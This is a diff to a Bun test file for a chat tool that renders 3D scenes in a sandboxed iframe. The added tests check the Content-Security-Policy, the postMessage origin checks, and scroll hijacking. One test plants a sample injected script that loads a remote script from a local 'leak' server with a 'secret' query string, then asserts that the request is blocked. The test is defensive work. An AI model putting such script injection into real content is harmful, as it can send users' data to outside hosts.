@@ -20,6 +20,9 @@ test("3d iframe vendors three.js, stays unique-origin, and keeps the fence sourc
   const page = readFileSync(new URL("../public/ncli3d.html", import.meta.url), "utf8");
   expect(page).toContain("/ncli3d.js");
   expect(page).toContain("/vendor/three.global.js");
+  expect(page).toMatch(/script-src 'self' blob:/);
+  expect(page).not.toMatch(/script-src[^"]*http:/);
+  expect(page).not.toMatch(/script-src[^"]*https:/);
   expect(page).not.toContain("cdn");
   expect(page).not.toContain("unpkg");
   expect(page).not.toContain("jsdelivr");
@@ -56,7 +59,10 @@ test("client parser and kit stay in lockstep with the 3d kind", () => {
   expect(js).toContain('sandbox="allow-scripts"');
   expect(js).not.toContain("allow-same-origin");
   expect(js).toContain("function bind3dPause");
+  expect(js).toContain("function live3dFrame");
+  expect(js).toContain("iframe.contentWindow === ev.source");
   expect(js).toContain('op === "wheel"');
+  expect(kit).toContain("ev.source !== parent");
   expect(kit).toContain("function desk");
   expect(kit).toContain("function box");
   expect(kit).toContain("mesa inteira");
@@ -167,8 +173,63 @@ test("chrome: a 3d fence paints the requested scene without same-origin", async 
     expect(facts.boxKind).toBe("box");
     expect(facts.tris).toBeGreaterThan(0);
     expect(facts.engine).toContain("three.js r170");
+    const before = await driver.session.evaluate<number>(`document.getElementById("chat")?.scrollTop || 0`);
+    await driver.session.evaluate(`window.postMessage({ type: "ncli-3d", op: "wheel", deltaY: 8000 }, "*")`);
+    await Bun.sleep(120);
+    const after = await driver.session.evaluate<number>(`document.getElementById("chat")?.scrollTop || 0`);
+    expect(after).toBe(before);
   } finally {
     driver?.close();
     booted.stop();
+  }
+}, 30000);
+
+test("chrome: a 3d fence cannot load a remote script", async () => {
+  if (!chromePath()) throw new Error("chrome not found");
+  const hits: string[] = [];
+  const leak = Bun.serve({
+    hostname: "127.0.0.1",
+    port: 0,
+    fetch(req) {
+      const u = new URL(req.url);
+      hits.push(`${u.pathname}${u.search}`);
+      return new Response("/* leak */", {
+        headers: {
+          "content-type": "application/javascript",
+          "access-control-allow-origin": "*",
+        },
+      });
+    },
+  });
+  const leakUrl = `http://127.0.0.1:${leak.port}/leak.js?d=secret`;
+  const source = `(function(){var s=document.createElement("script");s.src=${JSON.stringify(leakUrl)};document.documentElement.appendChild(s);ncli3d.desk();})()`;
+  const { hub } = await makeHub();
+  hub.memory.append({
+    kind: "talk",
+    text: "```ncli 3d\n" + source + "\n```",
+    seat: "claude",
+  });
+  hub.cfg.port = 19600 + Math.floor(Math.random() * 400);
+  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
+  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
+  try {
+    driver = await launchChrome(10100 + Math.floor(Math.random() * 400));
+    await driver.session.attachPage("about:blank");
+    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
+    await waitUntil(
+      () =>
+        driver!.session.evaluate(`(() => {
+          const desk = document.querySelector("iframe.live-3d");
+          return Boolean(desk && String(desk.dataset.ncli3dBtns || "").includes("mesa inteira"));
+        })()`),
+      12000,
+      "desk despite leak script",
+    );
+    await Bun.sleep(400);
+    expect(hits).toEqual([]);
+  } finally {
+    driver?.close();
+    booted.stop();
+    leak.stop();
   }
 }, 30000);
